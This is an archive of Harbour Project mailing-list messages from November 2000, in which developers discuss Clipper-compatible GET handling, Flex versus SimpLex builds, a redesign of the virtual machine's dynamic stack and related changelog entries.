     ! When 1st parameter (bSetGet) is NIL the bSetGet will be built
internally,
       not using macro in most cases, even if the Get Variable itself is a
macro :-)

   /* Ryszard, this will further break Flex support for GET, but makes
__GET() 100% Clipper compatible as you suggested.
      Please note, that Clipper does *NOT* pass a bSetGet *only* when the
Get Var is a *simple* *non* declared Variable.
      Declared Variables in this context are: MEMVAR, FIELD, LOCAL, and
STATIC. For all of those, bSetGet *is* generated!
      Clipper also generates bSetGet for "Complex Variables", i.e. Aliased
Variables, Object Data, etc.! */


From harbour@lists.harbour-project.org  Wed Nov 29 17:05:03 2000
From: harbour@lists.harbour-project.org (Felipe G. Coury)
Date: Wed Nov 29 17:05:03 2000
Subject: [Harbour] ping
Message-ID: <000901c05a59$aca30d50$3c01a8c0@creation>

Felipe G. Coury
Gerente de Desenvolvimento
Creation Internet Business
http://www.creation.com.br

--------------------------------------------
Visite o GuiaBrasil.Net:
http://www.guiabrasil.net
--------------------------------------------



From harbour@lists.harbour-project.org  Wed Nov 29 17:07:03 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Wed Nov 29 17:07:03 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas   <ron@profit-master.com>
In-Reply-To: <3A241263.15776.54F2052@localhost>
Message-ID: <LOBBKAFMMFGJIKLMEPAKMELDDHAA.ron@profit-master.com>

Ryszard,

>  _GET_ support in flex version is not finished yet. Simplex support
> is not compatible with Clipper. Clipper is not using a preprocessor
> to supply a set/get codeblock (this is the reason why I have removed
> it initially from the preprocessor). I cannot predict now if this
> will cause problems in user defined GET implementation. Your solution
> is again breaking a modularization - it is placed in Simplex, bison
> and preprocessor. Flex solution is placed in the expression optimizer
> only.

Please review, 2000-11-29 13:50 UTC+0800 Ron Pinkas <ron@profit-master.com>

SimpLex support was 100% Clipper compatible, but now thanks for your input,
I made the implementation logic identical to Clipper, (Generated P-Code is
practically 100% identical).

The recent change no longer uses preprocessor to supply a set/get block.

Please let me know if you have any input/suggestions regarding this last
change.

If you now agree that this solution is 100% Clipper compatible, and you want
me to implement same for Flex build, please let me know.

Ron


From harbour@lists.harbour-project.org  Wed Nov 29 17:35:03 2000
From: harbour@lists.harbour-project.org (JF Lefebvre)
Date: Wed Nov 29 17:35:03 2000
Subject: [Harbour] 2000-11-29 23:30 UTC+0100 jfl (mafact) <jfl@mafact.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKMELDDHAA.ron@profit-master.com>
References: <3A241263.15776.54F2052@localhost>
Message-ID: <202011292221.0ATMLIo24994@ev6.be.wanadoo.com>

This is work in progress, it does'nt break anything (up to now ;-))) )

2000-11-29 23:30 UTC+0100 jfl (mafact) <jfl@mafact.com>
   * include/hbclass.ch
     * some work in progress about :class message
   * source/rtl/tobject.prg
   * source/rtl/tclass.prg
     * some work in progress about :class message


Best regards,

J. Lefebvre,
Bruxelles,
Belgium


From harbour@lists.harbour-project.org  Wed Nov 29 17:39:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Wed Nov 29 17:39:02 2000
Subject: [Harbour] HBTEST (Eval) Bug
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKMELDDHAA.ron@profit-master.com>
Message-ID: <LOBBKAFMMFGJIKLMEPAKCELFDHAA.ron@profit-master.com>

Jean F.

2000-11-21 23:42 UTC-0100 JFL (mafact) <jfl@mafact.com>
   * source/vm/classes.c
     * minor modif after the last Stack tests
     * :EVAL forgot to release one created item
   * source/vm/eval.c
     * One possible PHB_ITEM use after stack realloc.. fixed (thkx Antonio)
   * source/vm/arrayshb.c
     * One possible PHB_ITEM use after stack realloc.. fixed (thkx Antonio)

Your change in eval.c line 48 from:

      hb_vmPush( pItem );

to:

      hb_vmPush( hb_stack.pBase + 2 );

Caused that HBTEST now fails when trying to execute line 224 of RT_Misc:

   TEST_LINE( Eval( @sbBlock ), NIL )

Apparently because of the missing de-referencing.

I am not sure if we must have support fro Eval( @SomeVar ) or not? If we do,
we need to fix eval.c, otherwise we need to fix hbtest.

Ron


From harbour@lists.harbour-project.org  Wed Nov 29 18:16:01 2000
From: harbour@lists.harbour-project.org (Luiz Rafael Culik Guimaraes)
Date: Wed Nov 29 18:16:01 2000
Subject: [Harbour] 2000-11-29 23:30 UTC+0100 jfl (mafact) <jfl@mafact.com>
References: <3A241263.15776.54F2052@localhost> <202011292221.0ATMLIo24994@ev6.be.wanadoo.com>
Message-ID: <005b01c05a5a$4bef3be0$0100007f@sl.conex.net>

Jean

> This is work in progress, it does'nt break anything (up to now ;-))) )
>
> 2000-11-29 23:30 UTC+0100 jfl (mafact) <jfl@mafact.com>
>    * include/hbclass.ch
>      * some work in progress about :class message
>    * source/rtl/tobject.prg
>    * source/rtl/tclass.prg
>      * some work in progress about :class message
>

Nice to know that you are working on Class messages.

Btw can you send the link response file i´ve asked for you

Regards

Luiz Rafael Culik


From harbour@lists.harbour-project.org  Wed Nov 29 18:54:02 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Wed Nov 29 18:54:02 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
Message-ID: <200011291852_MC2-BC8C-DE8C@compuserve.com>

Ryszard,

"I still don't understand why you want to limit the freedom of =

harbour usage for future users."

Why _I_ want to do that?  I don't!  I've been saying the exact
opposite of that.  I pointed out that a better way of allowing low-
priority tasks would solve many more problems than "idle" tasks, and
solve them better.

"Tasks called from the main VM loop will steel a time from the main =

flow of the application thus will cause some performance degradation."

That's a feature not a bug. <g>

"Or from a different perspective: INKEY() can be used to implement =

an events at an application level."

I don't think so.  It's also not like Clipper.

It's nice to see people thinking about new ways to do these things!

John.

From harbour@lists.harbour-project.org  Wed Nov 29 18:54:39 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Wed Nov 29 18:54:39 2000
Subject: [Harbour] Flex and Simplex probl.
Message-ID: <200011291852_MC2-BC8C-DE8B@compuserve.com>

Ron,

Sure - I'll send you something ASAP.  I suspect it's not the PPO or
C but am not sure, so I'll try not to send you too little. <g>  But
I don't think you'll need vast amounts. <BG>

John.

From harbour@lists.harbour-project.org  Wed Nov 29 19:13:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Wed Nov 29 19:13:02 2000
Subject: [Harbour] Flex and Simplex probl.
In-Reply-To: <200011291852_MC2-BC8C-DE8B@compuserve.com>
Message-ID: <LOBBKAFMMFGJIKLMEPAKGELGDHAA.ron@profit-master.com>

John,

Thanks.

The quickest way to know, is to compare the .C output from Flex build with
the .C from SimpLex. Any differences not related to _GET_ should be noted.

I tried the following (based on partial information), and could not find any
difference:

----
#include "hbclass.ch"

#xtranslate = <name>{ [<p,...>] } => = <name>():New( <p> )

CLASS TMyClass

   DATA cText, oFrom

   Method New( oVar, cText ) Constructor

   METHOD Create(cText) INLINE ::oWnd := MainWindow{self, cText}

END CLASS

METHOD New( cText ) CLASS TMyClass

   Self:cText := cText

RETURN Self
----

Ron

> Ron,
>
> Sure - I'll send you something ASAP.  I suspect it's not the PPO or
> C but am not sure, so I'll try not to send you too little. <g>  But
> I don't think you'll need vast amounts. <BG>
>
> John.


From harbour@lists.harbour-project.org  Wed Nov 29 19:22:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Wed Nov 29 19:22:02 2000
Subject: [Harbour] easy solution for the dynamic stack
In-Reply-To: <000001c059ea$9f38e820$0f2aa8c0@fivetechs>
Message-ID: <LOBBKAFMMFGJIKLMEPAKMELGDHAA.ron@profit-master.com>

Antonio,

Excellent idea.

We should also establish efficient management of the back-end pool of
HB_ITEMs that PHB_ITEM will point to.

Ron

> As some of you may be aware, Harbour has a
> dynamic symbols table. It works exactly the
> same was as Clipper's one. I implemented it.
>
> When I wrote it I found the exact problems
> we are facing now with the stack. Now, I just
> realized the stack may work the same way
> (sorry to be so slow thinking... :-)
>
> We need very minor changes to implement it.
>
> The actual Harbour dynamic stack has the
> following architecture:
>
>    HB_ITEM | HB_ITEM | HB_ITEM | HB_ITEM | ...
>
> that is, an array of HB_ITEMs. When we reallocate
> it, the addresses of those HB_ITEMs are no longer
> valid.
>
> It is as simple as turning it into the following:
>
>   PHB_ITEM | PHB_ITEM | PHB_ITEM | PHB_ITEM | ...
>
> so now, no matter how the stack reallocates, PHB_ITEMs
> point to the right place, always.
>
> We just need to do some minor changes into the
> stack related functions, but basically they will work
> exactly the same was as now.
>
> This is how the Harbour dynamic symbols table work, and
> it works great.
>
> your thoughts ?
>
> Antonio


From harbour@lists.harbour-project.org  Wed Nov 29 21:14:03 2000
From: harbour@lists.harbour-project.org (April)
Date: Wed Nov 29 21:14:03 2000
Subject: [Harbour] hello, April to earth...
References: <200011291632.eATGWqr26067@thor.parrett.net>
Message-ID: <3A25B6F1.EF66AD7@user.rose.com>

"David G. Holm" wrote:

> > - using djgpp with rsxntdj
>
>  (For example, I use both DJGPP and
> RSXNT, but have never attempted to use DJGPP with RSXNTDJ.)

what is rsxnt then?  (how) is it related to rsxntdj?

I have not installed cygwin nor mingw32 _yet_; I do find rsxntdj
to be an acceptable window api interface, and the apps are tinyish.

I guess like other gcc interfaces to win32, the apps are dependant 
on one or two extra dlls.

Thank you!

April



From harbour@lists.harbour-project.org  Wed Nov 29 21:41:02 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Wed Nov 29 21:41:02 2000
Subject: [Harbour] hello, April to earth...
In-Reply-To: <3A25B6F1.EF66AD7@user.rose.com>
References: <200011291632.eATGWqr26067@thor.parrett.net>
Message-ID: <200011300240.eAU2e1r12329@thor.parrett.net>

** Reply to message from April <awhite@user.rose.com> on Wed, 29 Nov
2000 21:09:53 -0500

> what is rsxnt then?  (how) is it related to rsxntdj?

You'll find the answers to both of those questions at
http://www.mathematik.uni-bielefeld.de/~rainer/
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Wed Nov 29 22:09:02 2000
From: harbour@lists.harbour-project.org (Charles Kwon ( Kwon,Oh-Jun))
Date: Wed Nov 29 22:09:02 2000
Subject: [Harbour] about Harbour for Palm??
References: <001001c059f9$de9f8960$0f2aa8c0@fivetechs> <3A24FB1B.86A39709@libero.it> <006f01c05a08$7770e720$6c7ba8c0@ssprg>
Message-ID: <000801c05a7a$362554a0$0200a8c0@ns>

SGFyYm91ciBjYW4gYmUgcnVubmluZyBvbiB0aGUgV2luQ0UgaWYgeW91IGJ1aWxkaW5nIGhhcmJv
dXIgV2l0aCBWaXN1YWwgQysrDQoNCkJlc3QgUmVnYXJkcywNCkNoYXJsZXMsS3dvbiANCg0KaHR0
cDovL3d3dy5maXZldGVjaC5uZXQNCkZpdmVUZWNoLk5ldA0KVEVMIDogKzgyLTItNTI3LTMzNTAN
CkZBWCA6ICs4Mi0yLTUyNy0zMDE5DQpJQ1EgOiAxOTMwMjI1OA0KDQpDb250YWN0IDogY29udGFj
dEBmaXZldGVjaC5uZXQNCi0tLS0tIE9yaWdpbmFsIE1lc3NhZ2UgLS0tLS0gDQo/PyA/PzogIrn5
pdYoU1MtQkJTKSIgPHNzYmJzQG1haWwyLnp6ei5jb20udHc+DQo/PyA/PzogPGhhcmJvdXJAbGlz
dHMuaGFyYm91ci1wcm9qZWN0Lm9yZz4NCj8/ID8/OiAyMDAwPyAxMT8gMjk/ID8/PyA/PyAxMDoy
OQ0KPz86IFtIYXJib3VyXSBhYm91dCBIYXJib3VyIGZvciBQYWxtPz8NCg0KDQo6IEhlbGxvIEFs
bCEhDQo6IA0KOiAgICAgICAgIENhbiBJIHdyaXRlIFBhbG0gQVBQIHVzZSBIYXJib3VyID8/DQo6
IA0KOiANCjogX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18N
CjogSGFyYm91ciBtYWlsaW5nIGxpc3QNCjogSGFyYm91ckBsaXN0cy5oYXJib3VyLXByb2plY3Qu
b3JnDQo6IGh0dHA6Ly93d3cubWF0cml4bGlzdC5jb20vbWFpbG1hbi9saXN0aW5mby9oYXJib3Vy
DQo6IA0KOiBUaGFuayB5b3UgZm9yIHBhcnRpY2lwYXRpbmcgaW4gVGhlIEhhcmJvdXIgUHJvamVj
dC4gIEJlIHN1cmUgdG8gY2hlY2sNCjogaHR0cDovL3d3dy5IYXJib3VyLVByb2plY3Qub3JnDQo=


From harbour@lists.harbour-project.org  Thu Nov 30 00:54:02 2000
From: harbour@lists.harbour-project.org (=?big5?B?ufml1lwoU1MtQkJTXCk=?=)
Date: Thu Nov 30 00:54:02 2000
Subject: [Harbour] about Harbour for Palm??
References: <001001c059f9$de9f8960$0f2aa8c0@fivetechs> <3A24FB1B.86A39709@libero.it> <006f01c05a08$7770e720$6c7ba8c0@ssprg> <000801c05a7a$362554a0$0200a8c0@ns>
Message-ID: <001401c05a91$6e399880$6c7ba8c0@ssprg>

But, I ever view one article of GCC for Palm!!
What mean is this??


> Harbour can be running on the WinCE if you building harbour With Visual
C++
>
> :         Can I write Palm APP use Harbour ??




From harbour@lists.harbour-project.org  Thu Nov 30 02:06:01 2000
From: harbour@lists.harbour-project.org (Phil Barnett)
Date: Thu Nov 30 02:06:01 2000
Subject: [Harbour] Dynamic stack idea.
Message-ID: <3A25B5DD.15553.43014C@localhost>

I was talking to another guy at work about the stack problems and 
he had an idea that might be usable.

Let's say we allocate a 250K stack. We know it's offset in memory 
and we know it's size.

When we put something on the stack, we get the location in the 
stack based on 0 being the first byte in the stack. If we run out of 
stack, allocate a larger block and copy the stack into it.

The only thing that changed was the offset.

Stack addressing would be (stackmasteroffset + stackoffset)

When we increase the stack size, stackoffset variables remain the 
same and the offset is a static variable that is updated when the 
stack is copied.

All stack references are created to the stackoffset from 0, not the 
real address in memory and the internal functions add the 
stackmasteroffset for the real memory address.

Run out of stack? Allocate a bigger chunk, copy in the old stack, 
update the new master offset, release the old chunk.

Need the real address? Add the stack pointer to the static 
stackmasteroffset variable in your C code. (or provide a wrapper 
function that does it)


-- 
              Phil Barnett  mailto:midnight@the-oasis.net
                       WWW  http://www.the-oasis.net/
                  FTP Site  ftp://ftp.the-oasis.net

From harbour@lists.harbour-project.org  Thu Nov 30 02:10:03 2000
From: harbour@lists.harbour-project.org (harbour@lists.harbour-project.org)
Date: Thu Nov 30 02:10:03 2000
Subject: [Harbour] 2000-11-29 23:30 UTC+0100 jfl (mafact) <jfl@mafact.com>
In-Reply-To: <005b01c05a5a$4bef3be0$0100007f@sl.conex.net>
Message-ID: <3A260B14.17984.4BCD4@localhost>

Hi Luiz

> > This is work in progress, it does'nt break anything (up to now ;-)))
> > )
> >
> > 2000-11-29 23:30 UTC+0100 jfl (mafact) <jfl@mafact.com>
> >    * include/hbclass.ch
> >      * some work in progress about :class message
> >    * source/rtl/tobject.prg
> >    * source/rtl/tclass.prg
> >      * some work in progress about :class message
> >
> 
> Nice to know that you are working on Class messages.
> 
> Btw can you send the link response file i=B4ve asked for you

Unfortunatly, I don't have one ready to use :-(

I'm trying to create one (based on the batch I sended to you and 
some BCC one). As son as I have one working, I will send it to you.



Best regards,

J. Lefebvre <jflefebv@mafact.com>
Mafact SA/NV
Belgium
(See us at http://www.mafact.com)
jflefebv@mafact.com


From harbour@lists.harbour-project.org  Thu Nov 30 02:13:01 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 30 02:13:01 2000
Subject: [Harbour] Dynamic stack idea.
In-Reply-To: <3A25B5DD.15553.43014C@localhost>
Message-ID: <LOBBKAFMMFGJIKLMEPAKKELIDHAA.ron@profit-master.com>

Phil,

This is indeed another good idea.

Ron

> I was talking to another guy at work about the stack problems and 
> he had an idea that might be usable.
> 
> Let's say we allocate a 250K stack. We know it's offset in memory 
> and we know it's size.
> 
> When we put something on the stack, we get the location in the 
> stack based on 0 being the first byte in the stack. If we run out of 
> stack, allocate a larger block and copy the stack into it.
> 
> The only thing that changed was the offset.
> 
> Stack addressing would be (stackmasteroffset + stackoffset)
> 
> When we increase the stack size, stackoffset variables remain the 
> same and the offset is a static variable that is updated when the 
> stack is copied.
> 
> All stack references are created to the stackoffset from 0, not the 
> real address in memory and the internal functions add the 
> stackmasteroffset for the real memory address.
> 
> Run out of stack? Allocate a bigger chunk, copy in the old stack, 
> update the new master offset, release the old chunk.
> 
> Need the real address? Add the stack pointer to the static 
> stackmasteroffset variable in your C code. (or provide a wrapper 
> function that does it)
> 
> 
> -- 
>               Phil Barnett  mailto:midnight@the-oasis.net
>                        WWW  http://www.the-oasis.net/
>                   FTP Site  ftp://ftp.the-oasis.net
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
> 

From harbour@lists.harbour-project.org  Thu Nov 30 02:23:02 2000
From: harbour@lists.harbour-project.org (Patrick Mast, Harbour)
Date: Thu Nov 30 02:23:02 2000
Subject: [Harbour] adir compatibility
In-Reply-To: <006d01c05a4d$c7ae3b80$59f6fbce@local>
Message-ID: <NCBBJKNMIDPJNLJCHCHIOEOGFJAA.harbour@winfakt.com>

Brian,

> Perhaps the HARBOUR_STRICT_CLIPPER_COMPATIBILITY flag should control this?
> If set, Directory() should force to upper before returning?
I also think this is a good solution.
regards,

Patrick Mast
www.Patrick.Be.kz

>
> ----- Original Message -----
> From: Dave Pearson <davep@davep.org>
> To: <harbour@lists.harbour-project.org>
> Sent: Wednesday, November 29, 2000 4:17 AM
> Subject: Re: [Harbour] adir compatibility
>
>
> > On Wed, Nov 29, 2000 at 06:57:25AM -0500, John Skelton wrote:
> > > Brian,
> > >
> > > Dare I suggest a SET for it?
> > >
> > > But on UNIX/Linux & many other OSes, changing the case would be a big
> > > mistake because the file systems are case-sensitive. :-)
> >
> > [ObNitPick: Can be case-sensitive, I've got a case-insensitive
> filesystem
> >             mounted on hagbard]
> >
> > FlagShip took this (a compatibility layer controlled by a run-time
> setting)
> > approach and it seemed sensible. I know I'm not the only one to have
> pointed
> > this out before.
> >
>
>
>
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
>
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
>
>


From harbour@lists.harbour-project.org  Thu Nov 30 02:33:02 2000
From: harbour@lists.harbour-project.org (Patrick Mast, Harbour)
Date: Thu Nov 30 02:33:02 2000
Subject: [Harbour] about Harbour for Palm??
In-Reply-To: <000801c05a7a$362554a0$0200a8c0@ns>
Message-ID: <NCBBJKNMIDPJNLJCHCHICEOHFJAA.harbour@winfakt.com>

Charles,

> Harbour can be running on the WinCE if you building harbour With 
> Visual C++
Did you tested this?

I'm intrested in this!!

regards,

Patrick Mast
www.Patrick.Be.kz


From harbour@lists.harbour-project.org  Thu Nov 30 04:11:01 2000
From: harbour@lists.harbour-project.org (Dave Pearson)
Date: Thu Nov 30 04:11:01 2000
Subject: [Harbour] adir compatibility
In-Reply-To: <006d01c05a4d$c7ae3b80$59f6fbce@local>; from bhays@abacuslaw.com on Wed, Nov 29, 2000 at 01:46:06PM -0800
References: <006d01c05a4d$c7ae3b80$59f6fbce@local>
Message-ID: <20001130084019.G6233@hagbard.davep.org>

On Wed, Nov 29, 2000 at 01:46:06PM -0800, Brian Hays wrote:

> Perhaps the HARBOUR_STRICT_CLIPPER_COMPATIBILITY flag should control this?
> If set, Directory() should force to upper before returning?

I thought that HARBOUR_STRICT_CLIPPER_COMPATIBILITY was something that
"happened" at the time of building harbour itself? That doesn't sound very
useful.

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: http://www.harbour-project.org/
FAQ................: http://www.harbour-project.org/faq/harbour.html
My harbour page....: http://www.hagbard.demon.co.uk/harbour/

From harbour@lists.harbour-project.org  Thu Nov 30 05:56:01 2000
From: harbour@lists.harbour-project.org (Antonio Linares)
Date: Thu Nov 30 05:56:01 2000
Subject: [Harbour] easy solution for the dynamic stack
In-Reply-To: <3A256D35.29940.538D766@localhost>
Message-ID: <000801c05abb$cd773620$0f2aa8c0@fivetechs>

Ryszard, JF, Ron

My plan is to change HB_STACK structure definition, and let
the compiler issue the errors and warnings, and start fixing.

What do you think ?

Antonio

>   The most common usage of stack is hvm.c, extend.c and debug.c
> These files are accessing the eval stack quite often
> A few references are in classes.c and some few other files.
> 
> Regards, Ryszard
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
> 
> 

From harbour@lists.harbour-project.org  Thu Nov 30 06:02:04 2000
From: harbour@lists.harbour-project.org (Antonio Linares)
Date: Thu Nov 30 06:02:04 2000
Subject: [Harbour] easy solution for the dynamic stack
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKMELGDHAA.ron@profit-master.com>
Message-ID: <000901c05abc$b4876ee0$0f2aa8c0@fivetechs>

> My plan is to change HB_STACK structure definition, and let
> the compiler issue the errors and warnings, and start fixing.

This is the new HB_STACK structure I propose.
Do you agree ?

/* stack managed by the virtual machine */
typedef struct
{
   PHB_ITEM * pItems;       /* pointer to the stack items */
   PHB_ITEM * pPos;         /* pointer to the latest used item */
   LONG     wItems;       /* total items that may be holded on the stack */
   HB_ITEM  Return;       /* latest returned value */
   PHB_ITEM * pBase;        /* stack frame position for the current function
call */
   PHB_ITEM * pEvalBase;    /* stack frame position for the evaluated
codeblock */
   int      iStatics;     /* statics base for the current function call */
   char     szDate[ 9 ];  /* last returned date from _pards() yyyymmdd
format */
} HB_STACK;


Antonio


From harbour@lists.harbour-project.org  Thu Nov 30 06:04:02 2000
From: harbour@lists.harbour-project.org (harbour@lists.harbour-project.org)
Date: Thu Nov 30 06:04:02 2000
Subject: [Harbour] easy solution for the dynamic stack
In-Reply-To: <000801c05abb$cd773620$0f2aa8c0@fivetechs>
References: <3A256D35.29940.538D766@localhost>
Message-ID: <3A2641AC.29021.128411@localhost>

Hi  Antonio

Ok for me, I could even modify Class.c as soon as you broke it ;-)))

> Ryszard, JF, Ron
> 
> My plan is to change HB_STACK structure definition, and let
> the compiler issue the errors and warnings, and start fixing.
> 
> What do you think ?
> 
> Antonio
> 
> >   The most common usage of stack is hvm.c, extend.c and debug.c
> > These files are accessing the eval stack quite often
> > A few references are in classes.c and some few other files.
> > 
> > Regards, Ryszard
> > 
> > _______________________________________________
> > Harbour mailing list
> > Harbour@lists.harbour-project.org
> > http://www.matrixlist.com/mailman/listinfo/harbour
> > 
> > Thank you for participating in The Harbour Project.  Be sure to
> > check http://www.Harbour-Project.org
> > 
> > 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
> 
> 



Best regards,

J. Lefebvre <jflefebv@mafact.com>
Mafact SA/NV
Belgium
(See us at http://www.mafact.com)
jflefebv@mafact.com


From harbour@lists.harbour-project.org  Thu Nov 30 06:35:03 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Thu Nov 30 06:35:03 2000
Subject: [Harbour] ChangeLog 2000-11-30 10:55 UTC+0100
Message-ID: <3A264A5E.7176.34244C3@localhost>

    *include/hbexpra.c
    *include/hbexprop.h
    *source/common/expropt1.c
    *source/compiler/expropta.c
    *source/macro/macroa.c
        * _GET_ => __GET translation is now fully Clipper compatible
     (except the non-declared variables issue that Ron has pointed
      lately although they can be edited correctly)
        
    *source/pp/pptable.c
        * Flex version doesn't pass a sixth argument to _GET_ function
          (Clipper passes 5 arguments only)
        
    *source/rtl/tgetint.prg
        * replaced all internal '_1' variables with
          PCOUNT()/HB_PVALUE(1)

NOTE: All code have to be rebuild!

Regards, Ryszard

From harbour@lists.harbour-project.org  Thu Nov 30 08:24:01 2000
From: harbour@lists.harbour-project.org (harbour@lists.harbour-project.org)
Date: Thu Nov 30 08:24:01 2000
Subject: [Harbour] ChangeLog 2000-11-30 10:55 UTC+0100
In-Reply-To: <3A264A5E.7176.34244C3@localhost>
Message-ID: <3A2662B6.937.939771@localhost>

Hi Ryszard,

Many thanks,

>     *include/hbexpra.c
>     *include/hbexprop.h
>     *source/common/expropt1.c
>     *source/compiler/expropta.c
>     *source/macro/macroa.c
>         * _GET_ => __GET translation is now fully Clipper compatible
>      (except the non-declared variables issue that Ron has pointed
>       lately although they can be edited correctly)
> 
>     *source/pp/pptable.c
>         * Flex version doesn't pass a sixth argument to _GET_ function
>           (Clipper passes 5 arguments only)
> 
>     *source/rtl/tgetint.prg
>         * replaced all internal '_1' variables with
>           PCOUNT()/HB_PVALUE(1)
> 
> NOTE: All code have to be rebuild!
> 
> Regards, Ryszard
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
> 
> 



Best regards,

J. Lefebvre <jflefebv@mafact.com>
Mafact SA/NV
Belgium
(See us at http://www.mafact.com)
jflefebv@mafact.com


From harbour@lists.harbour-project.org  Thu Nov 30 09:45:03 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Thu Nov 30 09:45:03 2000
Subject: [Harbour] 2000-11-29 13:50 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKIELDDHAA.ron@profit-master.com>
References: <200011291641.eATGfBr26937@thor.parrett.net>
Message-ID: <3A26770B.457.3F0C9B3@localhost>

On 29 Nov 2000, at 14:01, Ron Pinkas wrote:

>       Please note, that Clipper does *NOT* pass a bSetGet *only* when
>       the
> Get Var is a *simple* *non* declared Variable.

  Notice however that using __MVGET/__MVPUT will not work if this 
undeclared variable is a database field although I have not tested 
yet how Clipper works in such cases.

Regards, Ryszard

From harbour@lists.harbour-project.org  Thu Nov 30 10:12:02 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Thu Nov 30 10:12:02 2000
Subject: [Harbour] Dynamic stack idea.
Message-ID: <200011301011_MC2-BCA8-4771@compuserve.com>

Phil,

Doesn't it mean we have to change lots of code scattered in many
parts of Harbour?  And 3P people have the same problem (*).  And we
have to make sure 3P people who start with Harbour in the future know
to do this. :-(

(*) as I said before, I'm not much affected myself. :-)

John.

From harbour@lists.harbour-project.org  Thu Nov 30 10:12:49 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Thu Nov 30 10:12:49 2000
Subject: [Harbour] Flex and Simplex probl.
Message-ID: <200011301011_MC2-BCA8-4773@compuserve.com>

Ron,

It's nothing to do with GET, as you'll see from what I've sent. :-)

Nice try, though. :-)

John.

From harbour@lists.harbour-project.org  Thu Nov 30 11:03:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 30 11:03:02 2000
Subject: [Harbour] 2000-11-30 07:50 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <3A264A5E.7176.34244C3@localhost>
Message-ID: <LOBBKAFMMFGJIKLMEPAKIELKDHAA.ron@profit-master.com>

2000-11-30 07:50 UTC+0800 Ron Pinkas <ron@profit-master.com>
   * source/pp/pptable.c
     - Removed #ifdef SIMPLEX recently added by Ryszard, SimpLex was using
same 5 parameters as Cliiper.


From harbour@lists.harbour-project.org  Thu Nov 30 11:26:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 30 11:26:02 2000
Subject: [Harbour] 2000-11-29 13:50 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <3A26770B.457.3F0C9B3@localhost>
Message-ID: <LOBBKAFMMFGJIKLMEPAKGELLDHAA.ron@profit-master.com>

Ryszard,

Read TGetInt you'll see that __MVGET() and __MVPUT() are only used for Mem
Vars! For all other cases another block is used!

I tested Clipper _GET_ support extensively, SimpLex support is exactly
cloning Clipper behavior, in all cases I tested, including FIELDS.

Ron

> >       Please note, that Clipper does *NOT* pass a bSetGet *only* when
> >       the
> > Get Var is a *simple* *non* declared Variable.
>
>   Notice however that using __MVGET/__MVPUT will not work if this
> undeclared variable is a database field although I have not tested
> yet how Clipper works in such cases.
>
> Regards, Ryszard


From harbour@lists.harbour-project.org  Thu Nov 30 11:26:48 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Thu Nov 30 11:26:48 2000
Subject: [Harbour] Changelog 2000-11-30 16:00 UTC+0100
Message-ID: <3A268EA8.3068.44D0577@localhost>

    *source/rtl/tgetint.prg
        * restored '_1' variable because
          {|| ..... __MVPUT( cVar, HB_PVALUE(1) )}
          will not access a correct value

Regards, Ryszard

From harbour@lists.harbour-project.org  Thu Nov 30 11:29:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 30 11:29:02 2000
Subject: [Harbour] ChangeLog 2000-11-30 10:55 UTC+0100
In-Reply-To: <3A264A5E.7176.34244C3@localhost>
Message-ID: <LOBBKAFMMFGJIKLMEPAKKELLDHAA.ron@profit-master.com>

Ryszard,

Clipper's bSetGet checks explicitly for NIL, as opposed to PCount(). This is
why I changed it in TGetInt. Do you see any benefit in using PCount()?

In the name of strict compatibility I would prefer using _1, as Clipper
does, especially since HB_PVALUE is not included unless HB_EXTENSION is
defined. Which means __GET will stop working after your change, if
HB_EXTENSION is not defined.

Clipper does *not* convert _GET_(...) to __GET(...) or __GETA(...) in
macros. Flex build does, which may introduce compatibility problems. I would
recommend to protect it with #ifdef STRICT... if you still want to keep it.

Ron

>     *include/hbexpra.c
>     *include/hbexprop.h
>     *source/common/expropt1.c
>     *source/compiler/expropta.c
>     *source/macro/macroa.c
